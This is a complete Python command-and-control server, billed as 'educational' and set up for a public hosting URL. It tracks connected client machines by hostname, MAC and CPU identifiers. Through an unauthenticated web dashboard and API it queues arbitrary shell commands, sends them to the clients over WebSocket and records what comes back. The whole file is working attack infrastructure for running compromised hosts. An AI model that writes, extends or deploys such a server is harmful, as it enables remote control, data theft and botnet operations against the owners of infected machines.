#!/usr/bin/env python3
"""
ADVANCED C2 SERVER - EDUCATIONAL PURPOSES ONLY
Deploy to: https://c2-server-zz0i.onrender.com
"""

import asyncio
import websockets
import json
import base64
import hashlib
import time
from datetime import datetime
import logging
from typing import Dict, Set
import os
import ssl
import aiohttp
from aiohttp import web
import secrets
import uuid

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AdvancedC2Server:
    def __init__(self):
        self.clients: Dict[str, Dict] = {}  # Client ID -> Client data
        self.sessions: Dict[str, websockets.WebSocketServerProtocol] = {}  # Active WS connections
        self.command_queue: Dict[str, list] = {}  # Pending commands
        self.client_history: Dict[str, list] = {}  # Client command history
        self.active_tasks: Set[asyncio.Task] = set()
        
        # Server config
        self.host = "0.0.0.0"
        self.port = int(os.environ.get("PORT", 443))
        self.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
        
        # Web interface
        self.web_app = web.Application()
        self.setup_routes()
        
    def setup_routes(self):
        """Setup HTTP routes for web interface"""
        self.web_app.router.add_get('/', self.handle_dashboard)
        self.web_app.router.add_get('/api/clients', self.handle_api_clients)
        self.web_app.router.add_post('/api/command', self.handle_api_command)
        self.web_app.router.add_get('/api/logs/{client_id}', self.handle_api_logs)
        self.web_app.router.add_static('/static/', path='static', name='static')
        
    async def handle_dashboard(self, request):
        """Serve dashboard HTML"""
        with open('templates/index.html', 'r') as f:
            html = f.read()
        return web.Response(text=html, content_type='text/html')
    
    async def handle_api_clients(self, request):
        """API endpoint for client list"""
        clients_data = []
        current_time = time.time()
        
        for client_id, client_info in self.clients.items():
            # Determine if client is online (last seen < 2 minutes ago)
            last_seen = client_info.get('last_seen', 0)
            is_online = (current_time - last_seen) < 120
            
            clients_data.append({
                'id': client_id,
                'online': is_online,
                'hostname': client_info.get('info', {}).get('hostname', 'Unknown'),
                'os': client_info.get('info', {}).get('os', 'Unknown'),
                'ip': client_info.get('info', {}).get('ip', 'Unknown'),
                'last_seen': datetime.fromtimestamp(last_seen).strftime('%Y-%m-%d %H:%M:%S'),
                'first_seen': datetime.fromtimestamp(client_info.get('first_seen', 0)).strftime('%Y-%m-%d %H:%M:%S'),
                'version': client_info.get('info', {}).get('version', '1.0')
            })
        
        return web.json_response({
            'success': True,
            'clients': clients_data,
            'total': len(clients_data),
            'online': sum(1 for c in clients_data if c['online'])
        })
    
    async def handle_api_command(self, request):
        """API endpoint to send commands"""
        try:
            data = await request.json()
            client_id = data.get('client_id')
            command = data.get('command')
            
            if not client_id or not command:
                return web.json_response({'success': False, 'error': 'Missing parameters'})
            
            # Queue command for client
            if client_id not in self.command_queue:
                self.command_queue[client_id] = []
            
            command_id = str(uuid.uuid4())[:8]
            self.command_queue[client_id].append({
                'id': command_id,
                'command': command,
                'timestamp': time.time(),
                'status': 'pending'
            })
            
            # Log to client history
            if client_id not in self.client_history:
                self.client_history[client_id] = []
            
            self.client_history[client_id].append({
                'id': command_id,
                'command': command,
                'timestamp': time.time(),
                'direction': 'outgoing',
                'status': 'sent'
            })
            
            logger.info(f"Command queued for {client_id}: {command[:50]}...")
            
            return web.json_response({
                'success': True,
                'command_id': command_id,
                'message': 'Command queued'
            })
            
        except Exception as e:
            logger.error(f"API command error: {e}")
            return web.json_response({'success': False, 'error': str(e)})
    
    async def handle_api_logs(self, request):
        """API endpoint for client logs"""
        client_id = request.match_info.get('client_id')
        if not client_id or client_id not in self.client_history:
            return web.json_response({'success': False, 'error': 'Client not found'})
        
        logs = self.client_history.get(client_id, [])[-50:]  # Last 50 entries
        return web.json_response({
            'success': True,
            'logs': logs
        })
    
    def generate_client_id(self, info: dict) -> str:
        """Generate unique client ID"""
        unique_string = f"{info.get('hostname', '')}{info.get('mac', '')}{info.get('cpu_id', '')}"
        if not unique_string:
            unique_string = secrets.token_hex(8)
        
        return hashlib.sha256(unique_string.encode()).hexdigest()[:12]
    
    async def handle_client_connection(self, websocket, path):
        """Handle incoming client WebSocket connections"""
        client_id = None
        client_ip = websocket.remote_address[0]
        
        try:
            # Wait for client identification
            message = await websocket.recv()
            data = json.loads(message)
            
            # Extract client info
            client_info = data.get('info', {})
            client_info['ip'] = client_ip
            client_info['connection_time'] = time.time()
            
            # Generate or get client ID
            client_id = data.get('client_id') or self.generate_client_id(client_info)
            
            # Register client
            self.clients[client_id] = {
                'info': client_info,
                'last_seen': time.time(),
                'first_seen': time.time(),
                'ip': client_ip,
                'ws': websocket
            }
            
            self.sessions[client_id] = websocket
            
            logger.info(f"New client connected: {client_id} - {client_info.get('hostname', 'Unknown')}")
            
            # Send welcome message
            welcome_msg = {
                'type': 'welcome',
                'client_id': client_id,
                'timestamp': time.time(),
                'message': 'Connected to C2 server'
            }
            await websocket.send(json.dumps(welcome_msg))
            
            # Main client loop
            while True:
                try:
                    # Update last seen
                    self.clients[client_id]['last_seen'] = time.time()
                    
                    # Check for pending commands
                    if client_id in self.command_queue and self.command_queue[client_id]:
                        command_data = self.command_queue[client_id].pop(0)
                        
                        # Send command to client
                        command_msg = {
                            'type': 'command',
                            'command_id': command_data['id'],
                            'command': command_data['command'],
                            'timestamp': time.time()
                        }
                        
                        await websocket.send(json.dumps(command_msg))
                        
                        # Wait for response with timeout
                        try:
                            response = await asyncio.wait_for(websocket.recv(), timeout=30)
                            response_data = json.loads(response)
                            
                            # Log response
                            if client_id not in self.client_history:
                                self.client_history[client_id] = []
                            
                            self.client_history[client_id].append({
                                'id': command_data['id'],
                                'command': command_data['command'],
                                'response': response_data.get('output', ''),
                                'timestamp': time.time(),
                                'direction': 'incoming',
                                'status': 'completed'
                            })
                            
                            logger.info(f"Command {command_data['id']} completed for {client_id}")
                            
                        except asyncio.TimeoutError:
                            logger.warning(f"Command timeout for {client_id}")
                            self.client_history[client_id].append({
                                'id': command_data['id'],
                                'command': command_data['command'],
                                'response': 'Timeout',
                                'timestamp': time.time(),
                                'direction': 'incoming',
                                'status': 'timeout'
                            })
                    
                    else:
                        # Send heartbeat
                        heartbeat = {
                            'type': 'heartbeat',
                            'timestamp': time.time()
                        }
                        await websocket.send(json.dumps(heartbeat))
                        
                        # Wait for heartbeat response
                        await asyncio.sleep(10)
                        
                except websockets.exceptions.ConnectionClosed:
                    logger.info(f"Client {client_id} disconnected")
                    break
                except Exception as e:
                    logger.error(f"Error in client loop for {client_id}: {e}")
                    await asyncio.sleep(5)
                    
        except Exception as e:
            logger.error(f"Connection error: {e}")
        finally:
            # Cleanup
            if client_id:
                if client_id in self.sessions:
                    del self.sessions[client_id]
                if client_id in self.clients:
                    self.clients[client_id]['last_seen'] = time.time()
                    self.clients[client_id]['online'] = False
    
    async def cleanup_task(self):
        """Periodically cleanup stale clients"""
        while True:
            await asyncio.sleep(300)  # Every 5 minutes
            
            current_time = time.time()
            stale_clients = []
            
            for client_id, client_info in list(self.clients.items()):
                last_seen = client_info.get('last_seen', 0)
                if (current_time - last_seen) > 1800:  # 30 minutes
                    stale_clients.append(client_id)
            
            for client_id in stale_clients:
                if client_id in self.clients:
                    del self.clients[client_id]
                if client_id in self.command_queue:
                    del self.command_queue[client_id]
                
                logger.info(f"Cleaned up stale client: {client_id}")
    
    async def stats_task(self):
        """Periodically log server statistics"""
        while True:
            await asyncio.sleep(60)
            
            online_count = sum(1 for c in self.clients.values() if 
                             (time.time() - c.get('last_seen', 0)) < 120)
            
            logger.info(f"Server Stats - Clients: {len(self.clients)} | Online: {online_count} | " +
                       f"Queued Commands: {sum(len(q) for q in self.command_queue.values())}")
    
    async def start(self):
        """Start the C2 server"""
        # Generate SSL context if certificate exists
        ssl_context = None
        if os.path.exists('cert.pem'):
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context.load_cert_chain('cert.pem')
        
        # Start WebSocket server
        ws_server = await websockets.serve(
            self.handle_client_connection,
            self.host,
            self.port,
            ssl=ssl_context,
            ping_interval=20,
            ping_timeout=40,
            max_size=10 * 1024 * 1024  # 10MB
        )
        
        # Start background tasks
        self.active_tasks.add(asyncio.create_task(self.cleanup_task()))
        self.active_tasks.add(asyncio.create_task(self.stats_task()))
        
        # Start HTTP server for web interface
        runner = web.AppRunner(self.web_app)
        await runner.setup()
        site = web.TCPSite(runner, self.host, 8080)
        await site.start()
        
        logger.info(f"C2 Server started on {self.host}:{self.port} (WebSocket)")
        logger.info(f"Web interface available on port 8080")
        logger.info(f"Render URL: https://c2-server-zz0i.onrender.com")
        
        # Keep server running
        await asyncio.Future()

async def main():
    """Main entry point"""
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║           ADVANCED C2 SERVER - RENDER DEPLOYMENT         ║
    ║               EDUCATIONAL PURPOSES ONLY                  ║
    ║                 https://c2-server-zz0i.onrender.com      ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    # Check for SSL certificate
    if not os.path.exists('cert.pem'):
        logger.warning("SSL certificate not found. Generating self-signed certificate...")
        os.system("openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes -subj '/C=US/CN=localhost' 2>/dev/null || true")
    
    server = AdvancedC2Server()
    await server.start()

if __name__ == "__main__":
    asyncio.run(main())
